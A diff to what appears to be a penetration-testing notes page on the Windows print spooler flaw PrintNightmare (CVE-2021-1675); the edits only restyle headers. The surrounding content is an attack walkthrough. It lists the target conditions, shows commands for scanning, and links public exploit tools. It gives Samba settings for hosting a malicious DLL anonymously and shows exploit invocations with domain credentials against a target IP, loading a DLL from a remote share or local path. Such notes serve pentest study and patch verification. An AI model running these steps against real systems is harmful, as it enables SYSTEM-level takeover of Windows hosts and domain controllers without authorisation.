@@ -4,7 +4,7 @@
 
 The print spooler service is vulnerable to remote code execution that leverages a compromised user account, either domain-joined or local account, to take full control of a system as the NT SYSTEM user. Proof-of-concept (PoC) code has been made publicly available for this new vulnerability leaving every Windows system at extreme risk. An adversary exploiting this vulnerability can leverage a domain-joined account, regardless of permissions, to take full control as NT SYSTEM on any domain-joined Windows system. This includes servers and Domain Controllers. An adversary exploiting this vulnerability can also leverage a local account to take full control as NT SYSTEM on any Windows system that the local account is valid.
 
-## Requirements
+## <mark style="color:red;">Requirements</mark>
 
 * **Spooler Service** enabled (Mandatory)
 * Server with patches < June 21
@@ -12,7 +12,7 @@ The print spooler service is vulnerable to remote code execution that leverages 
 * Server with registry key `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall` = (DWORD) 1
 * Server with registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0
 
-## Detection
+## <mark style="color:red;">Detection</mark>
 
 We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable
 
@@ -31,7 +31,7 @@ itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
 docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
 ```
 
-## Tools
+## <mark style="color:red;">Tools</mark>
 
 {% embed url="https://github.com/cube0x0/CVE-2021-1675" %}
 
@@ -41,7 +41,7 @@ docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
 
 {% embed url="https://github.com/outflanknl/PrintNightmare" %}
 
-## Exploitation
+## <mark style="color:red;">Exploitation</mark>
 
 #### here we use the [python exploit](https://github.com/cube0x0/CVE-2021-1675) because it can do the job remotely.
 
@@ -55,7 +55,7 @@ python3 ./setup.py install
 CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share
 ```
 
-### SMB configuration
+### <mark style="color:orange;">SMB configuration</mark>
 
 #### Easiest way to host payloads is to use samba and modify `/etc/samba/smb.conf` to allow anonymous access
 
@@ -76,7 +76,7 @@ CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [de
     force user = smbuser
 ```
 
-#### From windows it's also possible
+#### <mark style="color:green;">From windows it's also possible</mark>
 
 ```
 mkdir C:\share
@@ -97,7 +97,7 @@ python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.
 python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
 ```
 
-### other methods
+### <mark style="color:orange;">other methods</mark>
 
 [SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)
 
